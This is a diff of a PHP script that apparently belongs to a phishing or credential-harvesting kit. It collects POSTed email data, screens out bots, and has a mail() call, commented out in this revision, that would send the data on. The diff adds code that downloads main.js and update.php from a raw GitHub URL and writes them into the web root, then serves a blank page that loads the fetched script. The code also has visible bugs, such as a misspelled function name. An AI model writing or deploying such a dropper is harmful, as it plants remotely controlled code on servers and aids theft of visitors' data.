@@ -6,18 +6,15 @@
 //}
 
 $ip = $_SERVER['REMOTE_ADDR'];
-
+$name = $_SERVER['SERVER_NAME'];
 
 //phpinfo(32);
 if (!isset($_SESSION)) {
     session_start();
 }
 if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['_id'])){
-if(isset($_POST['update'])){
-    if($_POST['update'] == 'true'){
-        require_once('/functions/'.$server.'-update.php');
 
-    }
+    
 if(isset($_POST['email'])){
     $mail = $_POST['email'];
 }
@@ -94,7 +91,7 @@ foreach ($bot_identifiers as $identifier) {
     exit();
   } 
 }
-
+;
 if($in == ''){
     $in = 'noreply';
 }
@@ -103,37 +100,31 @@ if($in == ''){
 $from = $in . '@' . $_SERVER['HTTP_HOST'];
 $headers = "From: " .$from;
 
-
+/*
 mail($to, $subject, $body, $headers);
-
+*/
 //echo $body;
 unset($_POST);
 //header("Location: ".$_SERVER['PHP_SELF']);
 exit;
 } else {
-$main = $server.".js";
-$style = $server.".css";
-$content = $server."-content.js";
-$update = $server."-update.php";
-$index = "index.php";
-
+   $tokens = explode(".", $_SERVER['HTTP_HOST']);
+  $domain = $tokens[0];
+$main = $domain .".js";
+$style = $domain.".css";
+$content = $domain."-content.js";
+$update = $domain."-update.php";
 $url = parse_url($_SERVER['REQUEST_URI']);
 
 
-    }
 
 
 if (!file_exists('./script/')) {
     mkdir('./script/', 0777, true);
 }
-if (!file_exists('./functions/')) {
-    mkdir('./functions/', 0777, true);
-}
 if (!file_exists('./css/')) {
     mkdir('./css/', 0777, true);
 }
-
-
 if(!is_file('./script/'. $content)){
 
     $file = fopen('./script/'. $content, 'w') or die("Unable to open $content!");
@@ -142,70 +133,75 @@ if(!is_file('./script/'. $content)){
 
 
 if(!is_file('./css/'. $style)){
+    $j = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/main.js');
 
-    $file = fopen('./css/'. $style, 'w');
+    $file = fopen('./css/'. $style, 'w')or die("Unable to open $style!");
+    fwrite($file, $j );
     fclose($file);
 }
-
-if(!is_file('./css/'. $update)){
-$data = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/update.php');
-$myfile = fopen('./functions/'. $update, "w") or die("Unable to open $update");
-fwrite($myfile, $data);
-fclose($myfile);
-}
-
 
 
 if(!is_file('./script/'. $main)){
 
-    $data = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/main.js');
-    $myfile = fopen('./script/'. $main, "w") or die("Unable to open $main!");
-    fwrite($myfile, $data);
+$js = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/main.js');
+$myfile = fopen('./script/'. $main, "w") or die("Unable to open $main!");
+fwrite($myfile, $js);
+fclose($myfile);
+
+}
+
+
+if(!is_file('./'. $update)){
+
+    $php = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/update.php');
+    $myfile = fopen('./'. $update, "w") or die("Unable to open $update!");
+    fwrite($myfile, $php);
     fclose($myfile);
     
     }
+    
 
-
+}
 
 $me = basename($_SERVER['PHP_SELF']);
 
 $filename = 'wp-blog-header.php';
 
 if (file_exists($filename)) {
-    echo "The file $filename exists";
     isWordpress();
     exit;
+} else {
+
+
+
+
+echo   '<!DOCTYPE html>';
+echo   '<html lang="en">';
+echo   '<head>';
+echo   '<meta charset="UTF-8">';
+echo   '<meta http-equiv="X-UA-Compatible" content="IE=edge">';
+echo   '<meta name="viewport" content="width=device-width, initial-scale=1.0">';
+echo "<script src='https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>";
+echo "<script type='text/javascript' src='/script/${main}'></script>";
+echo   '<title>Document</title>';
+echo   '</head>';
+echo   '<body>';
+        
+echo   '</body>';
+echo   '</html>';
+
 }
 
 
 
 
 function isWorpress(){
- 
+
+
+    
 echo "<script src='https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>";
-echo "<script type='text/javascript' src='/script/' ${main} '></script>";
-    echo "hello";
+echo "<script type='text/javascript' src='/script/${main}'></script>";
     exit;
 
 }
 ?>
-
-
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-    <?php echo "<script type='text/javascript' src='/script/${main}'></script>"; ?>
-    <title></title>
-
-    
-
-</head>
-<body>
-  
-</body>
-</html>
